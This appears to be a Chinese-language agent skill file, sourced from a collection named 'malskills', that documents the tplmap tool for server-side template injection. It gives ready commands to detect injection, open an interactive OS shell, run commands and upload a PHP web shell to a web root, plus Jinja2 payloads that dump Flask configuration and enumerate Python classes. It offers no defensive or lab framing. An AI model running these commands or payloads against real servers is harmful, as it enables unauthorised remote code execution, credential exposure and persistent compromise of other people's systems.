---
name: "tplmap"
description: ">"
---

# Tplmap

*Sourced from killvxk-malskills-zh*

# Tplmap

自动化 SSTI 检测与利用 —— 支持 18+ 模板引擎。

## 快速开始

```bash
git clone https://github.com/epinna/tplmap
cd tplmap && pip install -r requirements.txt

# 检测 SSTI
python2 tplmap.py -u "http://target.com/page?name=*"

# 通过 SSTI 获取 Shell
python2 tplmap.py -u "http://target.com/page?name=*" --os-shell

# 通过 SSTI 上传文件
python2 tplmap.py -u "http://target.com/page?name=*" --upload /local/shell.php /var/www/html/shell.php
```

## 核心参数

| 参数 | 用途 |
|------|---------|
| `-u URL` | 目标 URL（用 `*` 标记注入点） |
| `-d "k=v"` | POST 数据 |
| `-H "K:V"` | 自定义请求头 |
| `--os-shell` | 交互式 OS Shell |
| `--os-cmd CMD` | 执行单条命令 |
| `--upload src dst` | 上传文件 |
| `--download src dst` | 下载文件 |
| `--engine E` | 强制指定模板引擎 |
| `--level N` | 检测深度（1-5） |

## 支持的模板引擎

Jinja2 · Twig · Smarty · Mako · Pebble · Jade · Tornado · Velocity · Freemarker · Cheetah · ERB · EJS · DustJS · Nunjucks · Marko

## 常用工作流

**Jinja2 手动验证：**
```
{{7*7}} → 响应中出现 49 = 确认存在注入
{{config}} → 导出 Flask 配置
{{''.__class__.__mro__[1].__subclasses__()}} → 列举所有类
```

**自动化 RCE：**
```bash
python2 tplmap.py -u "http://target.com/render?tmpl=*" --os-shell
```

## 参考资源

| 文件 | 何时加载 |
|------|--------------|
| `references/` | 各模板引擎的手动 SSTI payload |

